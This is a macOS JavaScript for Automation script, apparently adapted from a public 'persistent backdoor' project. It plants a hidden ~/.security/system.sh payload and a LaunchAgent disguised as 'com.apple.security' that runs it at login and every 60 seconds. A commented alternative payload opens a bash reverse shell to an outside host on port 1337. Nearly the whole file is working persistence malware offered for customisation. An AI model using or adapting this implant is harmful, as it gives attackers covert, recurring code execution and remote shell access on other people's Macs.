//#!/usr/bin/env osascript -l JavaScript
// Rework of mosca1337's work:
// https://github.com/mosca1337/OSX-Peristant-BackDoor/blob/master/setup.bash
ObjC.import('Foundation')
ObjC.import("Cocoa");
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true; 

var userHome = $.getenv('HOME')

//Payload to execute 
//CHANGE THIS FOR DESIRED PAYLOAD !!!!
//var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
var payload = 'ps > ' + userHome + '/Desktop/pstest.txt'
// Another payload example
/* 
var payload = '#!/bin/bash
bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
wait'
*/
function createFolder(path, createIntermediateDirectories) {
    error = $()
   $.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
        $(path).stringByStandardizingPath, 
        createIntermediateDirectories, 
        $(), 
        error)
    if (error) {
        $.NSLog(error.localizedDescription);
    }
};

//Malicious plist
var plist = 
`<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.security</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>'$HOME'/.security/system.sh</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>60</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>`



//Create the hidden directory if it doesn't already exist

//var userHome = app.doShellScript("echo $HOME")
//var userHome = $.getenv('HOME')
var hiddenPath = userHome + "/.security"
isDir=Ref()
var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
if (hiddenDirectoryExistsCheck == false) {
	//console.log("Creating hidden directory...");
	createFolder("$HOME/.security",true)
	//app.doShellScript("mkdir $HOME/.security")
					}

//Create the malicious script which is saved to "$HOME/.security/system.sh"
//console.log("Creating malicious script...");
//app.doShellScript(payload);
var payloadPath = userHome + '/.security/system.sh'
writePayload = $.NSString.alloc.initWithUTF8String( payload )
writePayload.writeToFileAtomicallyEncodingError( payloadPath, true, $(), $() )

//Give the script permission to execute
app.doShellScript("chmod +x $HOME/.security/system.sh");

//Create user Launch Agent directory if it doesn't already exist
var lauchagentPath = userHome + "/Library/LaunchAgents"
var launchDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(lauchagentPath,isDir)
if (launchDirectoryExistsCheck == false) {
	createFolder("$HOME/Library/LaunchAgents",true)
	//app.doShellScript("mkdir $HOME/Library/LaunchAgents")
					}
//Write the .plist to LaunchAgents
//app.doShellScript("echo" + " " + plist + " " + " > $HOME/Library/LaunchAgents/com.apple.security.plist");
var plistfilePath = userHome + "/Library/LaunchAgents/com.apple.security.plist"
plistfileStr = $.NSString.alloc.initWithUTF8String( plist )
//fileStr.writeToFileAtomicallyEncodingError( plistfilePath, true, $.NSUTF8StringEncoding, $() )
plistfileStr.writeToFileAtomicallyEncodingError( plistfilePath, true, $(), $() )

//Load the LaunchAgent
app.doShellScript("launchctl load $HOME/Library/LaunchAgents/com.apple.security.plist");
